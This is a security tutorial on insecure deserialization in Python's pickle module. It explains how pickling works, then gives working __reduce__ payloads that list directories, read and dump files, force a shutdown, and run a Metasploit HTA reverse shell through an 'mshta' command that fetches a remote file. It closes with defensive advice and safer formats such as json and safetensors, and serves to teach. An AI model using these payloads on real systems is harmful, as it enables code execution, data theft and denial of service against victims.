## Who Stole My Pickles?

### Introduction

The `pickle` module in Python proves to be a very useful tool for storing and converting Python objects into bytes via serialization, and recovering said Python objects via deserialization. `pickle` is often used to save machine learning models and large Python objects as it is a built-in module that allows for all kinds of Python objects to be stored. It is also faster and more memory-efficient to save data using `pickle` as compared to storing it on a `.txt`/`.csv` file. Most importantly, it is easy to use.

However, all that glitters is not gold. While the `pickle` prove to be an asset in many of our Python projects, we often tend to forget that it has one major drawback that is highlighted by the developers in their <a href = "https://docs.python.org/3/library/pickle.html">documentation</a> of the source code:

> **Warning**: The `pickle` module **is not secure**. Only unpickle data you trust.
>
> It is possible to construct malicious pickle data which will **execute arbitrary code during unpickling**. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.

The security risk by itself is already a fatal flaw that discourages any potential users, even though we have yet to consider its other limitations (e.g. not human-readable, available only on Python). But what exactly makes the `pickle` module insecure?

In this report, we will first attempt to understand how the `pickle` module works. Next, we discover the various vulnerabilities and attack vectors during and after pickle deserialization. Lastly, we discuss some of the secure alternatives to the `pickle ` module. Throughout this report, we will be using Python 3.7 and the vanilla `pickle` module (not `cPickle`!). All of the following test cases will be carried out on Windows, though one can manipulate the shell commands accordingly so that it works for other OS such as MacOS and Linux.

### How does `pickle` work?

You would only need to know 2 important functions within the `pickle` module: `pickle.dumps()` for serialization and `pickle.loads()` for deserialization. To demonstrate how these 2 functions work, we can try to pickle a list of numbers.

```python
>>> import pickle
>>> lst = list(range(100))
```

To serialize the object `lst`:

```python
>>> data = pickle.dumps(lst)
```

We get a byte-stream `data`. We see that `lst` has been partially obfuscated:

```python
>>> print(data)
b'\x80\x03]q\x00(K\x00K\x01K\x02K\x03K\x04K\x05K\x06K\x07K\x08K\tK\nK\x0bK\x0cK\rK\x0eK\x0fK\x10K\x11K\x12K\x13K\x14K\x15K\x16K\x17K\x18K\x19K\x1aK\x1bK\x1cK\x1dK\x1eK\x1fK K!K"K#K$K%K&K\'K(K)K*K+K,K-K.K/K0K1K2K3K4K5K6K7K8K9K:K;K<K=K>K?K@KAKBKCKDKEKFKGKHKIKJKKKLKMKNKOKPKQKRKSKTKUKVKWKXKYKZK[K\\K]K^K_K`KaKbKce.'
```

Note that the byte-stream obtained may be different depending on the protocol used. I have used `protocol = 3` in the earlier scenario. You can get the highest protocol using `pickle.HIGHEST_PROTOCOL`, which generally gives you the greatest efficiency when using `pickle`.

To deserialize the byte-stream `data`:

```python
>>> result = pickle.loads(data)
```

We have finally recovered our list:

```python
>>> print(result)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99]
>>> print(result == lst)
True
```

Can we also pickle other Python objects like dictionaries and user-defined classes? Of course we can! Let us test out our postulation using a circular linked list:

```python
>>> class Node:
    	def __init__(self, value = None):
        	self.value = value
        	self.next = None

>>> class LinkedList:
    	def __init__(self):
            self.head = None

        def __str__(self):
            if self.head is None:
                return str([])
            result = [self.head.value]
            node = self.head.next
            while node is not self.head:
                result.append(node.value)
                node = node.next
            return str(result)
```

```python
>>> linked_list = LinkedList()
>>> linked_list.head = Node(0)
>>> node = linked_list.head
>>> for i in range(1, 10):
    	node.next = Node(i)
    	node = node.next
>>> node.next = linked_list.head
```

```python
>>> print(linked_list)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
```

We can then pickle the object `linked_list`:

```python
>>> data = pickle.dumps(linked_list)
```

Our byte string looks like this using `protocol = 3`:

```python
>>> print(data)
b'\x80\x03c__main__\nLinkedList\nq\x00)\x81q\x01}q\x02X\x04\x00\x00\x00headq\x03c__main__\nNode\nq\x04)\x81q\x05}q\x06(X\x05\x00\x00\x00valueq\x07K\x00X\x04\x00\x00\x00nextq\x08h\x04)\x81q\t}q\n(h\x07K\x01h\x08h\x04)\x81q\x0b}q\x0c(h\x07K\x02h\x08h\x04)\x81q\r}q\x0e(h\x07K\x03h\x08h\x04)\x81q\x0f}q\x10(h\x07K\x04h\x08h\x04)\x81q\x11}q\x12(h\x07K\x05h\x08h\x04)\x81q\x13}q\x14(h\x07K\x06h\x08h\x04)\x81q\x15}q\x16(h\x07K\x07h\x08h\x04)\x81q\x17}q\x18(h\x07K\x08h\x08h\x04)\x81q\x19}q\x1a(h\x07K\th\x08h\x05ububububububububububsb.'
```

Let us unpickle `data` and we get back our linked list. Note that the regenerated linked list object has a different id when compared to its original, though the contents remains the same:

```python
>>> result = pickle.loads(data)
```

```python
>>> print(result)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
>>> print(result == linked_list)
False
>>> print(result.__str__() == linked_list.__str__())
True
```

On another note, you can save Python objects to a file and then read it again by using `pickle.dump()` and `pickle.load()` respectively. There is also a much faster implementation of the `pickle` module in C code, which you can import as such:

```python
>>> try:
    	import cPickle as pickle # Pickle in C Code
	except:
        import pickle # Pickle in Python Code
```

### Pickles with Chicken RiCE

Sounds delicious! But wait, there is more to these pickles than meets the eye. The pickled data was laced with shell commands and took over my computer! What else can unsafe pickles do to attack our devices?

#### 1	Remote Code Execution (RCE)

RCE attacks allows the attacker to remotely execute malicious code on a target device. Through RCE, the attacker can gain control over the target device, steal sensitive documents and disrupt services. RCE usually happens because of poor validation of user input, and this is the case with pickled data which is not human-readable and difficult to sanitize.

The most common way to achieve RCE is by using the `__reduce__()` method in user-defined classes. This method takes no arguments and generally returns a tuple with two to six items. Optional items can be omitted or assigned as `None` values. Each item, in the following order, can be defined as such:

1. A callable which creates and returns a new object via the `__new__()` method of the user-defined class.
2. A tuple of arguments passed to the above function. If there are no arguments, an empty tuple is provided.
3. _(Optional)_ A dictionary containing the current state of the object, which can be retrieved using `__dict__` attribute of the user-defined class. This is passed to the class's `__setstate__()` method.
4. _(Optional)_ An iterator containing successive items, to be appended one by one via the `append()` method, or wholly via the `extend()` method, depending on the protocol version used and whether the object has said methods. Generally used for list subclasses.
5. _(Optional)_ An iterator containing successive key-value pairs, which will be stored to the object via the `__setitem__()` method. Generally used for dictionary subclasses.
6. _(Optional)_ A callable with a `(obj, state)` signature, for dynamic control over the state-updating behaviour of the object. This takes precedence over the `__setstate__()` method during deserialization.

To demonstrate how `__reduce__()` works, we can use the earlier implementation of a circular linked list is as such:

```python
>>> print(linked_list.__reduce__())
(<function _reconstructor at 0x0000020B40DD9798>, (<class '__main__.LinkedList'>, <class 'object'>, None), {'head': <__main__.Node object at 0x0000020B42C1D488>})
```

Generally speaking, `pickle` would fall back on the `__reduce__()` method when serializing a user-defined object. As such, the attackers can inject shell code into `__reduce__()` to achieve their nefarious goals. For example, the first and second items of the tuple will be the malicious function and its arguments respectively:

```python
>>> import os
>>> class PeekDirectory:
    	def __reduce__(self):
        	return (os.listdir, tuple())
```

```python
>>> import pickle
>>> with open("data.pkl", "wb") as file:
    	pickle.dump(PeekDirectory(), file)
    	file.close()
```

The attackers will then send the `data.pkl` file to other users to unpickle. Some of these unsuspecting users would attempt open and deserialize the file, only for their directory to be exposed! The following result can still be achieved even if the user had not imported the `os` module or defined the `PeekDirectory` class:

```python
>>> with open("data.pkl", "rb") as file:
    	result = pickle.load(file)
    	file.close()
```

```python
>>> print(result)
['test.py', 'flag.txt']
```

The structure of insecure pickle deserialization attacks tend to be similar in nature. We can first generate a malicious `.hta` file through the HTML Application (HTA) server on Metasploit's meterpreter:

```cmd
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

We get a URL to the `.hta` file as our output (i.e. `http://192.168.1.109:8080/malicious_file.hta`, with the name of the `.hta` file being randomly generated). Via the `__reduce__()` attack vector, we can use `os.system` to execute the following shell code on Windows command prompt:

```cmd
mshta http://192.168.1.109:8080/malicious_file.hta
```

This creates a reverse shell on the victim's device and we can sit back and enjoy, with the victim none the wiser.

#### 2 Data Theft

Hippity hoppity, your documents are now my property. Data breaches can be achieved easily through insecure deserialization of pickled data on the target's device.

The most straightforward method to steal data using the `pickle` module is using the `open()` in-built function. Let us discover the treasures that lie ahead in `flag.txt` which we discovered earlier.

```python
>>> class Robber:
    	def __reduce__(self):
        	return (open, ("flag.txt", "r"))
```

```python
>>> import pickle
>>> with open("flag.pkl", "wb") as file:
    	pickle.dump(Robber(), file)
    	file.close()
```

The victim unknowingly follows our documentation on how to use the pickled data `flag.pkl`, by using the `read()` method:

```python
>>> with open("flag.pkl", "rb") as file:
    	result = pickle.load(file)
    	file.close()
```

```python
>>> print(result.read())
We're no strangers to love
You know the rules and so do I (do I)
A full commitment's what I'm thinking of
You wouldn't get this from any other guy
I just wanna tell you how I'm feeling
Gotta make you understand
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
```

We've been tricked, we've been backstabbed and we've been quite possibly bamboozled! Where are the secrets? `flag.txt` gave us an unexpected rickroll!

However, the above assumes that the attacker already knows the names of the files in the current directory. Instead, we can use `subprocess.Popen` to expose all of the documents in the current directory by utilising a reverse shell:

```python
>>> import subprocess
>>> class Thief:
    	def __reduce__(self):
        	return (subprocess.Popen, ("type *", -1, None, -1, -1, -1, None, True, True))
```

```python
>>> import pickle
>>> with open("raid.pkl", "wb") as file:
    	pickle.dump(Thief(), file)
    	file.close()
```

The victim then accesses `raid.pkl` and tries to communicate with the class that they had just downloaded:

```python
>>> with open("raid.pkl", "rb") as file:
        result = pickle.load(file)
        file.close()
```

```python
>>> print(result.communicate())
(b'We\'re no strangers to love\r\nYou know the rules and so do I (do I)\r\nA full commitment\'s what I\'m thinking of\r\nYou wouldn\'t get this from any other guy\r\nI just wanna tell you how I\'m feeling\r\nGotta make you understand\r\nNever gonna give you up\r\nNever gonna let you down\r\nNever gonna run around and desert you\r\nNever gonna make you cry\r\nNever gonna say goodbye\r\nNever gonna tell a lie and hurt you\x80\x03csubprocess\nPopen\nq\x00(X\x06\x00\x00\x00type *q\x01J\xff\xff\xff\xffNJ\xff\xff\xff\xffJ\xff\xff\xff\xffJ\xff\xff\xff\xffN\x88\x88tq\x02Rq\x03.import pickle\r\nwith open("raid.pkl", "rb") as file:\r\n    result = pickle.load(file)\r\n    file.close()\r\n    \r\nprint(result.communicate())\r\n', b'\r\nflag.txt\r\n\r\n\r\n\r\nraid.pkl\r\n\r\n\r\n\r\ntest.py\r\n\r\n\r\n')
```

As you notice from the above, the contents of all of the files, including the victim's `test.py` file which was meant to process the pickled data, has been leaked successfully! On the victim's end, you might also realize that there was no need for them to import the required modules such as `os` and `subprocess`. This is because these modules are built-in and they are usually concealed in the background. Our payload would not have worked if we had used user-defined classes or external packages. We can use `subprocess.Popen` as an example to demonstrate that these built-in modules are really hidden away from prying eyes:

```python
>>> print([subclass for subclass in dict.__mro__[1].__subclasses__() if "communicate" in subclass.__dict__])
[<class 'subprocess.Popen'>]
>>> print(id([subclass for subclass in dict.__mro__[1].__subclasses__() if "communicate" in subclass.__dict__][0]))
1899806751768
>>> print(subprocess.Popen)
Traceback (most recent call last):
  File "<pyshell#1>", line 1, in <module>
    print(subprocess.Popen)
NameError: name 'subprocess' is not defined
```

```python
>>> import subprocess
>>> print(subprocess.Popen)
<class 'subprocess.Popen'>
>>> print(id(subprocess.Popen))
1899806751768
>>> print([subclass for subclass in dict.__mro__[1].__subclasses__() if "communicate" in subclass.__dict__][0] == subprocess.Popen)
True
```

With all that being said, the most effective method to steal documents on a target device is through RCE, as spawning a reverse shell allows for privilege escalation and total control over said device. 

#### 3 Denial of Service (DoS)

RCE can also cause a DoS by shutting down the target machine, preventing users from accessing it. As we are not trying to obtain an output from the victim's device, we can simply use `os.system` to execute a `shutdown` command in the subshell:

```python
>>> import os
>>> class Terrorist:
    	def __reduce__(self):
        	return (os.system, ("shutdown /f",))
```

```python
>>> import pickle
>>> with open("shutdown.pkl", "wb") as file:
    	pickle.dump(Terrorist(), file)
    	file.close()
```

The attacker sends `shutdown.pkl` to the victim to deserialize using the `pickle` module:

```python
>>> with open("shutdown.pkl", "rb") as file:
        result = pickle.load(file)
        file.close()
```

The force shutdown without any warning signs will confuse the victim and inflict great psychological damage, very effective.

### Conclusion

While the `pickle` module is inherently unsafe when it falls into the wrong hands, but it remains a powerful instrument as long as one avoids the caveats involved. Always remember to check the source code for any suspicious points, or even better, use a virtual machine when dealing with untrusted files. One can also use alternative modules for secure data serialization, such as <a href = "https://github.com/huggingface/safetensors">safetensors</a> for neural networks, or the built-in `json` which has the added benefit of easier data migration and human-readability.

### References

[1] https://docs.python.org/3/library/pickle.html

[2] http://frohoff.github.io/appseccali-marshalling-pickles/

[3] https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization

[4] https://medium.com/@abhishek.dev.kumar.94/sour-pickle-insecure-deserialization-with-python-pickle-module-efa812c0d565

[5] https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/

[6] https://github.com/huggingface/safetensors